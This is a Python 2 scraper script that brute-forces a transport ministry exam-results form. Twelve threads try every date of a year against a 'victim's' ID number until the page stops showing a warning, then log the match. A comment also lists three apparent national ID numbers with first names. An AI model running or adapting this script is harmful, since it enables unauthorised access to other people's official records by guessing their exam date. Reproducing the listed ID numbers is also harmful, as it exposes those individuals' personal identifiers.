#!/usr/bin/python
import mechanize
import cookielib
import sys, os
import threading
import time
from bs4 import BeautifulSoup

hit = False

#Returns the date dd/mm/yyyy
def ParseDate(day,month,year):
	return str(day) + '/'+ month + '/' + str(year)

# If an arguemnt isn't given, catches the error
def ArrBound(arr,i,defu):
	try:
		return int(arr[i])
	except IndexError:
		return defu

class Scraper(threading.Thread):
	url = 'https://motssl5.mot.gov.il/motmf/exams.php'  # The website
	id_num = sys.argv[1]                               #Victim's id number
	year = ArrBound(sys.argv,2,2013)                   # Year (currently the year never changes)
	def __init__(self,name,month):
		threading.Thread.__init__(self)        #threads stuff
		self.name = name                       #thread name
		self.month = month					   #thread's month
		self.day = 1                           #starting day

		#mechanize & cookielib configuration
		self.br = mechanize.Browser()
		self.br.set_handle_equiv(True)
		self.br.set_handle_gzip(True)
		self.br.set_handle_redirect(True)
		self.br.set_handle_referer(True)
		self.br.set_handle_robots(False)
		self.br.set_cookiejar(cookielib.LWPCookieJar())
		self.br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

		#run the thread
	def run(self):
		print self.name + " is starting!"
		scrape(self)
		print self.name + " is exiting!"

def scrape(me):
	while True:
		me.br.open(me.url)         # Go to the web site
		me.br.select_form(nr=0)	   # Select the form

		# Fill the form
		me.br.form['id'] = me.id_num
		me.br.form['theory_exam_date'] = ParseDate(me.day,me.month,me.year)

		# Submit the form
		resp = me.br.submit()

		# Start Soup
		soup = BeautifulSoup(resp.read())
		global hit
		if not soup.findAll("div", { "class" : "warning" }): #If warning div isnt found = score!
			print "\nGot it!"
			date = ParseDate(me.day,me.month,me.year)
			print me.id_num
			print date
			log(me.id_num,date)

			print "\n\nWaiting for the rest of"\
				  " the threads to finish...\n"
			break
		elif hit:
			break
		else:
			me.day += 1
			if me.day == 32:
				break

# Log results
def log(id_num, date):
	out = open('drive_results.txt','a')
	out.write(str(id_num) + " --> " + date + "\n")
	out.close
	global hit
	hit = True

#209040740-beiman#208721399-udi#208994798-yuval

# Check input
if len(sys.argv) == 1:
	print "\nusage: python " + sys.argv[0] \
	+ " <id> <starting year>\n"
	sys.exit()

print "\nID: " + str(sys.argv[1]) + "\n\n"

# Create new threads
threads = []
for i in range(12):
	threads.append(Scraper("Thread " + str(i+1), str(i+1).zfill(2)))
	threads[i].start()

for t in threads:
	t.join()

# if not hit:
# 	print "Nothing was found..."
# 	inpt = raw_input("Would you like to try a different year?(y\\n) ")
# 	if inpt == 'y':
# 		new_year = raw_input("Enter the new year: ")
# 		for t in threads:
# 			t.year=new_year
# 			t.day = 1
# 			t.scrape()